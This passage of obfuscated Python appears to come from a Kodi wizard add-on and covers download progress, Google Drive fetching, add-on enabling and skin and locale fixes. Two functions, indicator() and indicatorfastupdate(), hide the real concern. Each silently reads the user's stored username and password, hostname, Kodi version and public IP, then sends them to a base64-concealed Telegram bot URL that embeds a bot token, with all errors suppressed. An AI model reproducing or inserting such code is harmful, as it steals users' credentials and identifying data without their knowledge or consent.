            os .remove (O0O0OOO000OOOOOO0 )#line:3475
           except :#line:3476
            pass #line:3477
           break #line:3478
        OOO00O0OOOO0000O0 =float (OO000000OOO0O000O )/OO0O0000O000O00OO #line:3479
        OOO00O0OOOO0000O0 =round (OOO00O0OOOO0000O0 *100 ,2 )#line:3480
        OO00OOO00OOO000O0 =OO000000OOO0O000O /(1024 *1024 )#line:3481
        O0OO000OOO0O00OO0 =OO0O0000O000O00OO /(1024 *1024 )#line:3482
        OOO00OOOOOOOO0O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OOO00OOO000O0 ,'teal',O0OO000OOO0O00OO0 )#line:3483
        if (time .time ()-OOOO0O0O00OO0000O )>0 :#line:3484
          OO0OOOO00OO0O000O =OO000000OOO0O000O /(time .time ()-OOOO0O0O00OO0000O )#line:3485
          OO0OOOO00OO0O000O =OO0OOOO00OO0O000O /1024 #line:3486
        else :#line:3487
         OO0OOOO00OO0O000O =0 #line:3488
        O00O0O000O000OO0O ='KB'#line:3489
        if OO0OOOO00OO0O000O >=1024 :#line:3490
           OO0OOOO00OO0O000O =OO0OOOO00OO0O000O /1024 #line:3491
           O00O0O000O000OO0O ='MB'#line:3492
        if OO0OOOO00OO0O000O >0 and not OOO00O0OOOO0000O0 ==100 :#line:3493
            OO0O00OOO0O0OOO0O =(OO0O0000O000O00OO -OO000000OOO0O000O )/OO0OOOO00OO0O000O #line:3494
        else :#line:3495
            OO0O00OOO0O0OOO0O =0 #line:3496
        OO00OOO000OO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OOOO00OO0O000O ,O00O0O000O000OO0O )#line:3497
        OOO00OO0000O0O000 .update (int (OOO00O0OOOO0000O0 ),"Downloading "+name ,OOO00OOOOOOOO0O0O ,OO00OOO000OO0O0OO )#line:3499
  OOOO000O0O00OOO0O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3502
  OOOOO000OOOO00O00 .close ()#line:3504
  extract (O0O0OOO000OOOOOO0 ,OOOO000O0O00OOO0O ,OOO00OO0000O0O000 )#line:3506
  if os .path .exists (OOOO000O0O00OOO0O +'/scakemyer-script.quasar.burst'):#line:3507
    if os .path .exists (OOOO000O0O00OOO0O +'/script.quasar.burst'):#line:3508
     shutil .rmtree (OOOO000O0O00OOO0O +'/script.quasar.burst',ignore_errors =False )#line:3509
    os .rename (OOOO000O0O00OOO0O +'/scakemyer-script.quasar.burst',OOOO000O0O00OOO0O +'/script.quasar.burst')#line:3510
  if os .path .exists (OOOO000O0O00OOO0O +'/plugin.video.kmediatorrent-master'):#line:3512
    if os .path .exists (OOOO000O0O00OOO0O +'/plugin.video.kmediatorrent'):#line:3513
     shutil .rmtree (OOOO000O0O00OOO0O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3514
    os .rename (OOOO000O0O00OOO0O +'/plugin.video.kmediatorrent-master',OOOO000O0O00OOO0O +'/plugin.video.kmediatorrent')#line:3515
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3516
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3517
  try :#line:3518
    os .remove (O0O0OOO000OOOOOO0 )#line:3519
  except :#line:3520
    pass #line:3521
  OOO00OO0000O0O000 .close ()#line:3522
def dis_or_enable_addon (OOOOOO0OO0O0OOO00 ,OO0O00000OOOOO0OO ,enable ="true"):#line:3523
    import json #line:3524
    OO000O0O00000000O ='"%s"'%OOOOOO0OO0O0OOO00 #line:3525
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOOO0OO0O0OOO00 )and enable =="true":#line:3526
        logging .warning ('already Enabled')#line:3527
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOOOO0OO0O0OOO00 )#line:3528
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOOO0OO0O0OOO00 )and enable =="false":#line:3529
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOOOO0OO0O0OOO00 )#line:3530
    else :#line:3531
        O0O00O0O0O0O00O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO000O0O00000000O ,enable )#line:3532
        OO0OOOOO0OOOOOOO0 =xbmc .executeJSONRPC (O0O00O0O0O0O00O0O )#line:3533
        OO00O0OO0OOO0OOOO =json .loads (OO0OOOOO0OOOOOOO0 )#line:3534
        if enable =="true":#line:3535
            xbmc .log ("### Enabled %s, response = %s"%(OOOOOO0OO0O0OOO00 ,OO00O0OO0OOO0OOOO ))#line:3536
        else :#line:3537
            xbmc .log ("### Disabled %s, response = %s"%(OOOOOO0OO0O0OOO00 ,OO00O0OO0OOO0OOOO ))#line:3538
    if OO0O00000OOOOO0OO =='auto':#line:3539
     return True #line:3540
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3541
def chunk_report (OOO000O00OO0O00O0 ,OOOO0O00O0OO0OOO0 ,O0O0OOOO0OOO00O0O ):#line:3542
   O0OOOOOO00OOOOO00 =float (OOO000O00OO0O00O0 )/O0O0OOOO0OOO00O0O #line:3543
   O0OOOOOO00OOOOO00 =round (O0OOOOOO00OOOOO00 *100 ,2 )#line:3544
   if OOO000O00OO0O00O0 >=O0O0OOOO0OOO00O0O :#line:3546
      sys .stdout .write ('\n')#line:3547
def chunk_read (OO0O00000O0000OO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3549
   import time #line:3550
   O00000OOOOO0O0O0O =int (filesize )*1000000 #line:3551
   OOO00OO000OOO00O0 =0 #line:3553
   OOOO0O0OOOOOOO000 =time .time ()#line:3554
   O0O00OOO00OO0OO00 =0 #line:3555
   logging .warning ('Downloading')#line:3557
   with open (destination ,"wb")as O0O0O0OOOOO0OOO00 :#line:3558
    while 1 :#line:3559
      O0OOO000OOOO0OO0O =time .time ()-OOOO0O0OOOOOOO000 #line:3560
      O000000OO00OOOO0O =int (O0O00OOO00OO0OO00 *chunk_size )#line:3561
      OO0000OOOOOOOOO0O =OO0O00000O0000OO0 .read (chunk_size )#line:3562
      O0O0O0OOOOO0OOO00 .write (OO0000OOOOOOOOO0O )#line:3563
      O0O0O0OOOOO0OOO00 .flush ()#line:3564
      OOO00OO000OOO00O0 +=len (OO0000OOOOOOOOO0O )#line:3565
      O00OOOOOO0O0O0O0O =float (OOO00OO000OOO00O0 )/O00000OOOOO0O0O0O #line:3566
      O00OOOOOO0O0O0O0O =round (O00OOOOOO0O0O0O0O *100 ,2 )#line:3567
      if int (O0OOO000OOOO0OO0O )>0 :#line:3568
        O0O00O0O0OO0O00OO =int (O000000OO00OOOO0O /(1024 *O0OOO000OOOO0OO0O ))#line:3569
      else :#line:3570
         O0O00O0O0OO0O00OO =0 #line:3571
      if O0O00O0O0OO0O00OO >1024 and not O00OOOOOO0O0O0O0O ==100 :#line:3572
          O00OO0000O0OOOO00 =int (((O00000OOOOO0O0O0O -O000000OO00OOOO0O )/1024 )/(O0O00O0O0OO0O00OO ))#line:3573
      else :#line:3574
          O00OO0000O0OOOO00 =0 #line:3575
      if O00OO0000O0OOOO00 <0 :#line:3576
        O00OO0000O0OOOO00 =0 #line:3577
      dp .update (int (O00OOOOOO0O0O0O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OOOOOO0O0O0O0O ,O000000OO00OOOO0O /(1024 *1024 ),O00000OOOOO0O0O0O /(1000 *1000 ),O0O00O0O0OO0O00OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OO0000O0OOOO00 ,60 ))#line:3578
      if dp .iscanceled ():#line:3579
         dp .close ()#line:3580
         break #line:3581
      if not OO0000OOOOOOOOO0O :#line:3582
         break #line:3583
      if report_hook :#line:3585
         report_hook (OOO00OO000OOO00O0 ,chunk_size ,O00000OOOOO0O0O0O )#line:3586
      O0O00OOO00OO0OO00 +=1 #line:3587
   logging .warning ('END Downloading')#line:3588
   return OOO00OO000OOO00O0 #line:3589
def googledrive_download (OOOO0O00O0O0OO00O ,O0O0O000O0000000O ,O0O000OOO0OO00OO0 ,O0OOO000O00O00OOO ):#line:3591
    O0OO0O00000OOOOO0 =[]#line:3595
    O0O000O0O0O0O0OOO =OOOO0O00O0O0OO00O .split ('=')#line:3596
    OOOO0O00O0O0OO00O =O0O000O0O0O0O0OOO [len (O0O000O0O0O0O0OOO )-1 ]#line:3597
    def OO00OOOO0O0O0O0OO (O0O0O0OOO0O0OO0OO ):#line:3599
        for O000OOO00000000OO in O0O0O0OOO0O0OO0OO :#line:3601
            logging .warning ('cookie.name')#line:3602
            logging .warning (O000OOO00000000OO .name )#line:3603
            OO00OOO0O0000O0OO =O000OOO00000000OO .value #line:3604
            if 'download_warning'in O000OOO00000000OO .name :#line:3605
                logging .warning (O000OOO00000000OO .value )#line:3606
                logging .warning ('cookie.value')#line:3607
                return O000OOO00000000OO .value #line:3608
            return OO00OOO0O0000O0OO #line:3609
        return None #line:3611
    def O0OOO0OOO0O000O0O (O0O000000OOO0OOOO ,O0O0OOOOOOOO0OO0O ):#line:3613
        OOOO000OOO0OO0O0O =32768 #line:3615
        OOO0O0O0O000000O0 =time .time ()#line:3616
        with open (O0O0OOOOOOOO0OO0O ,"wb")as O00OO0O0O0OO00OO0 :#line:3618
            O0O000O00O0O0000O =1 #line:3619
            O0O000OOO00O00O0O =32768 #line:3620
            try :#line:3621
                OOO0000OOO000OO0O =int (O0O000000OOO0OOOO .headers .get ('content-length'))#line:3622
                print ('file total size :',OOO0000OOO000OO0O )#line:3623
            except TypeError :#line:3624
                print ('using dummy length !!!')#line:3625
                OOO0000OOO000OO0O =int (O0OOO000O00O00OOO )*1000000 #line:3626
            for OOOO0OOO0O000OO00 in O0O000000OOO0OOOO .iter_content (OOOO000OOO0OO0O0O ):#line:3627
                if OOOO0OOO0O000OO00 :#line:3628
                    O00OO0O0O0OO00OO0 .write (OOOO0OOO0O000OO00 )#line:3629
                    O00OO0O0O0OO00OO0 .flush ()#line:3630
                    O00O000O0OO000O0O =time .time ()-OOO0O0O0O000000O0 #line:3631
                    OOO000000OO00O0OO =int (O0O000O00O0O0000O *O0O000OOO00O00O0O )#line:3632
                    if O00O000O0OO000O0O ==0 :#line:3633
                        O00O000O0OO000O0O =0.1 #line:3634
                    O0O0OOO00O0000O0O =int (OOO000000OO00O0OO /(1024 *O00O000O0OO000O0O ))#line:3635
                    OO0OO00000O0O00O0 =int (O0O000O00O0O0000O *O0O000OOO00O00O0O *100 /OOO0000OOO000OO0O )#line:3636
                    if O0O0OOO00O0000O0O >1024 and not OO0OO00000O0O00O0 ==100 :#line:3637
                      O0OOO0O0OOO0OO0O0 =int (((OOO0000OOO000OO0O -OOO000000OO00O0OO )/1024 )/(O0O0OOO00O0000O0O ))#line:3638
                    else :#line:3639
                      O0OOO0O0OOO0OO0O0 =0 #line:3640
                    O0O000OOO0OO00OO0 .update (int (OO0OO00000O0O00O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0OO00000O0O00O0 ,OOO000000OO00O0OO /(1024 *1024 ),OOO0000OOO000OO0O /(1000 *1000 ),O0O0OOO00O0000O0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OOO0O0OOO0OO0O0 ,60 ))#line:3642
                    O0O000O00O0O0000O +=1 #line:3643
                    if O0O000OOO0OO00OO0 .iscanceled ():#line:3644
                     O0O000OOO0OO00OO0 .close ()#line:3645
                     break #line:3646
    OO0OOO00O000OO0OO ="https://docs.google.com/uc?export=download"#line:3647
    import urllib2 #line:3652
    import cookielib #line:3653
    from cookielib import CookieJar #line:3655
    OO0O0O00O0OOOOOO0 =CookieJar ()#line:3657
    OO0OOOO0O0000OO00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0O0O00O0OOOOOO0 ))#line:3658
    O00OOO0OO000OOOO0 ={'id':OOOO0O00O0O0OO00O }#line:3660
    O0OO00OOOOO000OOO =urllib .urlencode (O00OOO0OO000OOOO0 )#line:3661
    logging .warning (OO0OOO00O000OO0OO +'&'+O0OO00OOOOO000OOO )#line:3662
    OOO00O00O00O00OOO =OO0OOOO0O0000OO00 .open (OO0OOO00O000OO0OO +'&'+O0OO00OOOOO000OOO )#line:3663
    O0O0O000OOO0O0OOO =OOO00O00O00O00OOO .read ()#line:3664
    for O0OOO0OO000O00OOO in OO0O0O00O0OOOOOO0 :#line:3666
         logging .warning (O0OOO0OO000O00OOO )#line:3667
    O00OO00OO00OOOO0O =OO00OOOO0O0O0O0OO (OO0O0O00O0OOOOOO0 )#line:3668
    logging .warning (O00OO00OO00OOOO0O )#line:3669
    if O00OO00OO00OOOO0O :#line:3670
        OOOOOO0000O000O00 ={'id':OOOO0O00O0O0OO00O ,'confirm':O00OO00OO00OOOO0O }#line:3671
        O0O0OO0OOOO0000O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3672
        O0OO00OOOOO000OOO =urllib .urlencode (OOOOOO0000O000O00 )#line:3673
        OOO00O00O00O00OOO =OO0OOOO0O0000OO00 .open (OO0OOO00O000OO0OO +'&'+O0OO00OOOOO000OOO )#line:3674
        chunk_read (OOO00O00O00O00OOO ,report_hook =chunk_report ,dp =O0O000OOO0OO00OO0 ,destination =O0O0O000O0000000O ,filesize =O0OOO000O00O00OOO )#line:3675
    return (O0OO0O00000OOOOO0 )#line:3679
def kodi17Fix ():#line:3680
	O0O000OO0O0000O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3681
	OOOOO000O0O0O0O00 =[]#line:3682
	for O0000000000OOO0O0 in sorted (O0O000OO0O0000O00 ,key =lambda OOOO0OOO00OOO0O00 :OOOO0OOO00OOO0O00 ):#line:3683
		OO0O0OOO000OOOOO0 =os .path .join (O0000000000OOO0O0 ,'addon.xml')#line:3684
		if os .path .exists (OO0O0OOO000OOOOO0 ):#line:3685
			O0OOOO0O0OO00OO00 =O0000000000OOO0O0 .replace (ADDONS ,'')[1 :-1 ]#line:3686
			OO0O0OOO0OOOOOO00 =open (OO0O0OOO000OOOOO0 )#line:3687
			OO00O00O0OO00O0O0 =OO0O0OOO0OOOOOO00 .read ()#line:3688
			OOO0O0OOO000OOO00 =parseDOM (OO00O00O0OO00O0O0 ,'addon',ret ='id')#line:3689
			OO0O0OOO0OOOOOO00 .close ()#line:3690
			try :#line:3691
				O000OOO00O00O00OO =xbmcaddon .Addon (id =OOO0O0OOO000OOO00 [0 ])#line:3692
			except :#line:3693
				try :#line:3694
					log ("%s was disabled"%OOO0O0OOO000OOO00 [0 ],xbmc .LOGDEBUG )#line:3695
					OOOOO000O0O0O0O00 .append (OOO0O0OOO000OOO00 [0 ])#line:3696
				except :#line:3697
					try :#line:3698
						log ("%s was disabled"%O0OOOO0O0OO00OO00 ,xbmc .LOGDEBUG )#line:3699
						OOOOO000O0O0O0O00 .append (O0OOOO0O0OO00OO00 )#line:3700
					except :#line:3701
						if len (OOO0O0OOO000OOO00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OOOO0O0OO00OO00 ,xbmc .LOGERROR )#line:3702
						else :log ("Unabled to enable: %s"%O0000000000OOO0O0 ,xbmc .LOGERROR )#line:3703
	if len (OOOOO000O0O0O0O00 )>0 :#line:3704
		OOO00O00000O0OO0O =0 #line:3705
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3706
		for O0O0OOO0OOOOO0O0O in OOOOO000O0O0O0O00 :#line:3707
			OOO00O00000O0OO0O +=1 #line:3708
			OOOO00OOOOO00OO0O =int (percentage (OOO00O00000O0OO0O ,len (OOOOO000O0O0O0O00 )))#line:3709
			DP .update (OOOO00OOOOO00OO0O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OOO0OOOOO0O0O ))#line:3710
			addonDatabase (O0O0OOO0OOOOO0O0O ,1 )#line:3711
			if DP .iscanceled ():break #line:3712
		if DP .iscanceled ():#line:3713
			DP .close ()#line:3714
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3715
			sys .exit ()#line:3716
		DP .close ()#line:3717
	forceUpdate ()#line:3718
def indicator ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          OOO0OOO0O00OOOO0O =(ADDON .getSetting ("user"))#line:3724
          O0OO00O00O0O0O0O0 =(ADDON .getSetting ("pass"))#line:3725
          OOO000OO0O0OO00OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          O00000OOO0O00OO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3727
          OOO0OO0OOO0O0O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3728
          OO0O00O00OOO0OO00 =str (json .loads (OOO0OO0OOO0O0O000 )['ip'])#line:3729
          O000O00O0OOO00OOO =OOO0OOO0O00OOOO0O #line:3730
          O000000O000OO0O00 =O0OO00O00O0O0O0O0 #line:3731
          import socket #line:3732
          OOO0OO0OOO0O0O000 =urllib2 .urlopen (O00000OOO0O00OO0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000O00O0OOO00OOO +' - '+O000000O000OO0O00 +' - '+OOO000OO0O0OO00OO +' - '+OO0O00O00OOO0OO00 ).readlines ()#line:3733
       except :pass #line:3735
def indicatorfastupdate ():#line:3737
       try :#line:3738
          import json #line:3739
          wiz .log ('FRESH MESSAGE')#line:3740
          O000OOO0OO00O00O0 =(ADDON .getSetting ("user"))#line:3741
          O00O00OOOO0O00O00 =(ADDON .getSetting ("pass"))#line:3742
          OO00O0O0OO00O0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3743
          O0OOOOO0O00000OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3745
          O000OOOO000000O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3746
          OO0OO0O00000O0O00 =str (json .loads (O000OOOO000000O00 )['ip'])#line:3747
          OOOO0OOOO0O0OOOOO =O000OOO0OO00O00O0 #line:3748
          O0000O0OO0000000O =O00O00OOOO0O00O00 #line:3749
          import socket #line:3751
          O000OOOO000000O00 =urllib2 .urlopen (O0OOOOO0O00000OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO0OOOO0O0OOOOO +' - '+O0000O0OO0000000O +' - '+OO00O0O0OO00O0000 +' - '+OO0OO0O00000O0O00 ).readlines ()#line:3752
       except :pass #line:3754
def skinfix18 ():#line:3756
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3757
		O00O0O00OOOO0O0O0 =wiz .workingURL (SKINID18DDONXML )#line:3758
		if O00O0O00OOOO0O0O0 ==True :#line:3759
			OOOOOO0OOOO0OOO0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3760
			if len (OOOOOO0OOOO0OOO0O )>0 :#line:3761
				O0O00O0OOOOOO0O0O ='%s-%s.zip'%(SKINID18 ,OOOOOO0OOOO0OOO0O [0 ])#line:3762
				OOOO0O0OOO00O0OO0 =wiz .workingURL (SKIN18ZIPURL +O0O00O0OOOOOO0O0O )#line:3763
				if OOOO0O0OOO00O0OO0 ==True :#line:3764
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3765
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3766
					O000O00OO000OOO0O =os .path .join (PACKAGES ,O0O00O0OOOOOO0O0O )#line:3767
					try :os .remove (O000O00OO000OOO0O )#line:3768
					except :pass #line:3769
					downloader .download (SKIN18ZIPURL +O0O00O0OOOOOO0O0O ,O000O00OO000OOO0O ,DP )#line:3770
					extract .all (O000O00OO000OOO0O ,HOME ,DP )#line:3771
					try :#line:3772
						OO00O0O000O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3773
						OOOOO00OOOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3774
						os .rename (OO00O0O000O0OOO0O ,OOOOO00OOOO0O0000 )#line:3775
					except :#line:3776
						pass #line:3777
					try :#line:3778
						O0O000000000O0000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0O0O00O00OOO0OOO =O0O000000000O0000 .read ();O0O000000000O0000 .close ()#line:3779
						OOOOO0OO000OOOO0O =wiz .parseDOM (O0O0O00O00OOO0OOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3780
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO0OO000OOOO0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3781
					except :#line:3782
						pass #line:3783
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3784
					DP .close ()#line:3785
					xbmc .sleep (500 )#line:3786
					wiz .forceUpdate (True )#line:3787
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3788
				else :#line:3789
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3790
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOO0O0OOO00O0OO0 ,xbmc .LOGERROR )#line:3791
			else :#line:3792
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3793
		else :#line:3794
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3795
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3796
def skinfix17 ():#line:3797
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3798
		OO0O00OOOOOO00O00 =wiz .workingURL (SKINID17DDONXML )#line:3799
		if OO0O00OOOOOO00O00 ==True :#line:3800
			OO0OOOOOOO0000O0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3801
			if len (OO0OOOOOOO0000O0O )>0 :#line:3802
				O000OOOO0000O00OO ='%s-%s.zip'%(SKINID17 ,OO0OOOOOOO0000O0O [0 ])#line:3803
				O0O000O00OOO0O00O =wiz .workingURL (SKIN17ZIPURL +O000OOOO0000O00OO )#line:3804
				if O0O000O00OOO0O00O ==True :#line:3805
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3806
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3807
					OOO00OO0OOO0O00O0 =os .path .join (PACKAGES ,O000OOOO0000O00OO )#line:3808
					try :os .remove (OOO00OO0OOO0O00O0 )#line:3809
					except :pass #line:3810
					downloader .download (SKIN17ZIPURL +O000OOOO0000O00OO ,OOO00OO0OOO0O00O0 ,DP )#line:3811
					extract .all (OOO00OO0OOO0O00O0 ,HOME ,DP )#line:3812
					try :#line:3813
						O0OO00O0OO00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3814
						O00O00000O00OO0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3815
						os .rename (O0OO00O0OO00OOOO0 ,O00O00000O00OO0O0 )#line:3816
					except :#line:3817
						pass #line:3818
					try :#line:3819
						O0O00OO0OOOO0O000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0OO00OOOOOO00O00 =O0O00OO0OOOO0O000 .read ();O0O00OO0OOOO0O000 .close ()#line:3820
						O00OO00O0OOOO0O00 =wiz .parseDOM (O0OO00OOOOOO00O00 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3821
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00O0OOOO0O00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3822
					except :#line:3823
						pass #line:3824
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3825
					DP .close ()#line:3826
					xbmc .sleep (500 )#line:3827
					wiz .forceUpdate (True )#line:3828
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3829
				else :#line:3830
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3831
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O000O00OOO0O00O ,xbmc .LOGERROR )#line:3832
			else :#line:3833
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3834
		else :#line:3835
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3836
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3837
def fix17update ():#line:3838
	if KODIV >=17 and KODIV <18 :#line:3839
		wiz .kodi17Fix ()#line:3840
		xbmc .sleep (4000 )#line:3841
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3842
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3843
		fixfont ()#line:3844
		O000000OOOO00O00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3845
		try :#line:3847
			O000000OO00O0O0OO =open (O000000OOOO00O00O ,'r')#line:3848
			OOOO00O0OO0OOO000 =O000000OO00O0O0OO .read ()#line:3849
			O000000OO00O0O0OO .close ()#line:3850
			O0OO00O0OOO0OOOO0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3851
			O0OO0OO00O00000OO =re .compile (O0OO00O0OOO0OOOO0 ).findall (OOOO00O0OO0OOO000 )[0 ]#line:3852
			O000000OO00O0O0OO =open (O000000OOOO00O00O ,'w')#line:3853
			O000000OO00O0O0OO .write (OOOO00O0OO0OOO000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0OO0OO00O00000OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3854
			O000000OO00O0O0OO .close ()#line:3855
		except :#line:3856
				pass #line:3857
		wiz .kodi17Fix ()#line:3858
		O000000OOOO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3859
		try :#line:3860
			O000000OO00O0O0OO =open (O000000OOOO00O00O ,'r')#line:3861
			OOOO00O0OO0OOO000 =O000000OO00O0O0OO .read ()#line:3862
			O000000OO00O0O0OO .close ()#line:3863
			O0OO00O0OOO0OOOO0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3864
			O0OO0OO00O00000OO =re .compile (O0OO00O0OOO0OOOO0 ).findall (OOOO00O0OO0OOO000 )[0 ]#line:3865
			O000000OO00O0O0OO =open (O000000OOOO00O00O ,'w')#line:3866
			O000000OO00O0O0OO .write (OOOO00O0OO0OOO000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0OO0OO00O00000OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3867
			O000000OO00O0O0OO .close ()#line:3868
		except :#line:3869
				pass #line:3870
		swapSkins ('skin.Premium.mod')#line:3871
def fix18update ():#line:3873
	if KODIV >=18 :#line:3874
		xbmc .sleep (4000 )#line:3875
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3876
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3877
		fixfont ()#line:3878
		O0OO0O0O0OOOO00O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3879
		try :#line:3880
			OOOOOO000O00O0O00 =open (O0OO0O0O0OOOO00O0 ,'r')#line:3881
			OO000O0O00000OO00 =OOOOOO000O00O0O00 .read ()#line:3882
			OOOOOO000O00O0O00 .close ()#line:3883
			OOO000O00O000O000 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3884
